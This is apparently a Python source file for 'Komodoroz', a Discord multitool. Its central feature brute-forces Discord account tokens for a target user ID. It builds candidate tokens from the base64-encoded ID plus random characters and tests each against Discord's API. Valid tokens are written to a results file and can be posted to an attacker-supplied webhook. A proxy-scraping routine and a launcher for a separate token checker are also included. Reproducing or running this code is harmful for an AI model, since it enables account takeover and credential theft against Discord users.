import os, sys, fade, requests, json, discord, time, base64, random, string, threading, ctypes, re
from tkinter import messagebox
from datetime import datetime
from discord import Webhook, SyncWebhook
from pystyle import *
from discord_webhook import DiscordWebhook, DiscordEmbed
from colorama import Fore as F
from alive_progress import alive_bar
os.system("cls")
os.system("@mode con cols=90 lines=30")
os.system("title Komodoroz ^| komodoroz.tk ^| Developed by franafp.es")

w=F.LIGHTWHITE_EX
r=F.RED
g=F.GREEN
y=F.LIGHTYELLOW_EX
b=F.LIGHTBLUE_EX
black=F.LIGHTBLACK_EX
m=F.LIGHTMAGENTA_EX
c=F.LIGHTCYAN_EX


gui="""
    ╔═════════════════════════════════════════════╗
    ║        ╦╔═╔═╗╔╦╗╔═╗╔╦╗╔═╗╦═╗╔═╗╔═╗          ║
    ║        ╠╩╗║ ║║║║║ ║ ║║║ ║╠╦╝║ ║╔═╝          ║
    ║        ╩ ╩╚═╝╩ ╩╚═╝═╩╝╚═╝╩╚═╚═╝╚═╝          ║
    ╚═════════════════════════════════════════════╝
        ╔═══════════════════════════════════╗
        ║ Type "help" for show the commands ║
        ╚═══════════════════════════════════╝
"""
brute_token_gui="""
    ╔═════════════════════════════════════════════╗
    ║        ╦╔═╔═╗╔╦╗╔═╗╔╦╗╔═╗╦═╗╔═╗╔═╗          ║
    ║        ╠╩╗║ ║║║║║ ║ ║║║ ║╠╦╝║ ║╔═╝          ║
    ║        ╩ ╩╚═╝╩ ╩╚═╝═╩╝╚═╝╩╚═╚═╝╚═╝          ║
    ║       ╔╗ ╦═╗╦ ╦╔╦╗╔═╗╔═╗╔═╗╦═╗╔═╗╔═╗        ║
    ║       ╠╩╗╠╦╝║ ║ ║ ║╣ ╠╣ ║ ║╠╦╝║  ║╣         ║
    ║       ╚═╝╩╚═╚═╝ ╩ ╚═╝╚  ╚═╝╩╚═╚═╝╚═╝        ║
    ╚═════════════════════════════════════════════╝
        ╔═══════════════════════════════════╗
        ║  [!] Developed by franafp.es [!]  ║
        ╚═══════════════════════════════════╝
"""
token_checker_gui="""
    ╔════════════════════════════════════════════╗
    ║        ╦╔═╔═╗╔╦╗╔═╗╔╦╗╔═╗╦═╗╔═╗╔═╗         ║
    ║        ╠╩╗║ ║║║║║ ║ ║║║ ║╠╦╝║ ║╔═╝         ║
    ║        ╩ ╩╚═╝╩ ╩╚═╝═╩╝╚═╝╩╚═╚═╝╚═╝         ║
    ║             ╔╦╗╔═╗╦╔═╔═╗╔╗╔                ║
    ║              ║ ║ ║╠╩╗║╣ ║║║                ║
    ║              ╩ ╚═╝╩ ╩╚═╝╝╚╝                ║
    ║           ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗            ║
    ║           ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝            ║
    ║           ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═            ║
    ╚════════════════════════════════════════════╝
        ╔═══════════════════════════════════╗
        ║  [!] Developed by franafp.es [!]  ║
        ╚═══════════════════════════════════╝
"""
items = list(range(0,37))
l = len(items)
faded_gui=fade.pinkred(gui)
faded_gui_brute_token=fade.pinkred(brute_token_gui)
faded_gui_token_checker=fade.pinkred(token_checker_gui)
print(faded_gui)
def loadbar(iteration, total, prefix='', suffix='', decimals=1, length=100, fill='#'):
    percent = ('{0:.' + str(decimals) + 'f}').format(100 * (iteration/float(total)))
    filledLength = int(length * iteration // total)
    bar = fill * filledLength + '-' * (length - filledLength)
    Write.Print(f"\r                                       {prefix} |{bar}| {percent}% {suffix}", Colors.purple_to_blue, interval=0.000)
    if iteration == total:
        print()
def getTempDir():
    system = os.name
    if system == 'nt':
        return os.getenv('temp')
    elif system == 'posix':
        return '/tmp/'
def proxy_scrape():
    proxy_log = []
    System.Title("Komodoroz Multitool v1.0 ^| Collecting Proxys...")
    starTime = time.time()
    temp = getTempDir() + "\\komodroz_proxys"
    Write.Print("[>] Collecting Proxys...", Colors.purple_to_blue, interval=0.000)
    loadbar(0, l, prefix='', suffix='', length=l)
    for i, item in enumerate(items):
        time.sleep(0.1)
        loadbar(i + 1, l, prefix='', suffix='', length=l)
    
    def fetchProxies(url, custom_regex):
        global proxylist
        try:
            proxylist=requests.get(url, timeout=5).text
        except Exception:
            pass
        finally:
            proxylist = proxylist.replace('null', '')
        custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
        custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
        for proxy in re.findall(re.compile(custom_regex), proxylist):
            proxy_log.append(f"{proxy[0]}:{proxy[1]}")
            
proxie_input=Write.Input(f"[->] Do you want scrape proxys? [y/n] -> ", Colors.purple_to_blue, interval=0.000)
if proxie_input == "y" or "Y":
    if os.path.basename(sys.argv[0]).endswith("exe"):
        with open(getTempDir() + "\\komodoroz_proxys", "w"): pass
        os.system("cls")
        #proxy_scrape()
else:
    proxy = False
def clear():
    if sys.platform.startswith('win'):
        os.system('cls')
    else:
        os.system('clear')
def main():
    command=Write.Input(f"""
┌─────$ Komodoroz@{os.getlogin()}\n└─> """, Colors.purple_to_blue, interval=0.000)
    if command== "cls" or command == "clear":
        clear()
        print(faded_gui)
        main()
    elif command == "1":
        bruteforce_token()
    elif command == "2":
        os.system("cls")
        os.system("python token_checker.py")
    else:
        Write.Print(f"""\n            [x] "{command}" is a invalid command [x]\n""", Colors.red_to_purple, interval=0.000)
        main()
def bruteforce_token():
    clear()
    System.Title("Komodoroz v1.0 ^| Token Bruteforce ^| Developed by franafp.es")
    print(faded_gui_brute_token+"\n")
    id2token = base64.b64encode((Write.Input("[->] Put a user id for start the bruteforce: ", Colors.red_to_purple, interval=0.000)).encode('ascii'))
    id2token = str(id2token)[2:-1]
    webhookuse = Write.Input("[->] Do you want use a webhook for send the valid tokens?(yes/no) --> ", Colors.red_to_purple, interval=0.000)
    if webhookuse == "yes":
        webhook = Write.Input("[->] Put the webhook url: ", Colors.red_to_purple, interval=0.000)
        try:
            url = DiscordWebhook(url=webhook, username="Komodoroz Multitool v1.0", avatar_url="https://cdn.discordapp.com/attachments/1046473966992248852/1058482274393399377/fran_afp__crea_un_logo_con_el_fondo_png_con_una_redonda_girada__dc4612a2-add1-4134-8fcf-11aea077bc98.png")
            embed = DiscordEmbed(title="Komodoroz Multitool v1.0", description="```Webhook is synced```", color=0x62007d)
            embed.set_footer(text="Komodoroz Multitool v1.0 | Token Bruteforcer", icon_url="https://cdn.discordapp.com/attachments/1046473966992248852/1058482274393399377/fran_afp__crea_un_logo_con_el_fondo_png_con_una_redonda_girada__dc4612a2-add1-4134-8fcf-11aea077bc98.png", url="https://komodoroz.tk")
            embed.set_author(name="Komodoroz Multitool v1.0", icon_url="https://cdn.discordapp.com/attachments/1046473966992248852/1058482274393399377/fran_afp__crea_un_logo_con_el_fondo_png_con_una_redonda_girada__dc4612a2-add1-4134-8fcf-11aea077bc98.png")
            embed.set_thumbnail(url="https://komodoroz.tk/media/logo.png")
            url.add_embed(embed)
            url.username = "Komodoroz Multitool v1.0"
            response = url.execute()
            time.sleep(1)
            print(f"[{m}[{w}OK{m}] {g}Webhook synced")
            time.sleep(1)
        except ConnectionError:
            print(f"{m}[{w}ERROR{m}] {r}The webhook is invalid")
    else:
        print("")
    while id2token == id2token:
        token= id2token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
        header = {'Authorization': token, 'Content-Type': 'application/json'}
        login=requests.get("https://discordapp.com/api/v7/users/@me", headers=header)
        try:
            if login.status_code == 200:
                print(f"{F.LIGHTMAGENTA_EX}[{F.LIGHTWHITE_EX}VALID TOKEN{F.LIGHTMAGENTA_EX}] {F.LIGHTGREEN_EX}" + f" " + f"{token}")
                messagebox.showinfo(mesage=f"The token is resolved\nToken: {token}", title=f"[✅] Token Bruteforced | Developed by franafp.es")
                f=open('./results/token_bruteforcer/hit.txt', "a+")
                f.write(f'[TOKEN BRUTEFORCED] {token} $ --> [BRUTEFORCED BY github.com/franafp]\n')
                time.sleep(2)
                clear()
                print(faded_gui_brute_token)
                print(f"{F.LIGHTMAGENTA_EX}[{F.LIGHTWHITE_EX}OK{F.LIGHTMAGENTA_EX}] {F.GREEN}The token is saved in {F.LIGHTBLACK_EX}--{F.LIGHTMAGENTA_EX}>{F.LIGHTYELLOW_EX} {os.getcwd}/results/token_bruteforcer/hit.txt")
                time.sleep(0.5)
                opendirectory=Write.Input("[?] Do you want open the results directory? (y/n) --> ", Colors.red_to_purple, interval=0.000)
                if opendirectory=="y" or "Y" or "yes":
                    os.system(f"explorer {os.getcwd}/results/token_bruteforcer")
                else:
                    pass
                clear()
                main()
            else:
                print(f"{F.LIGHTMAGENTA_EX}[{F.LIGHTWHITE_EX}INVALID TOKEN{F.LIGHTMAGENTA_EX}] {F.RED}" + " " + token)
        except KeyboardInterrupt:
            clear()
            print(faded_gui_brute_token)
            messagebox.showerror(message="The bruteforce is canceled for you", title="[❌] Bruteforce Canceled | Developed by franafp.es")
            clear()
            print(faded_gui)
            main()
def token_checker(token2check):
    os.system("cls")
    os.system("python token_checker.py")
main()
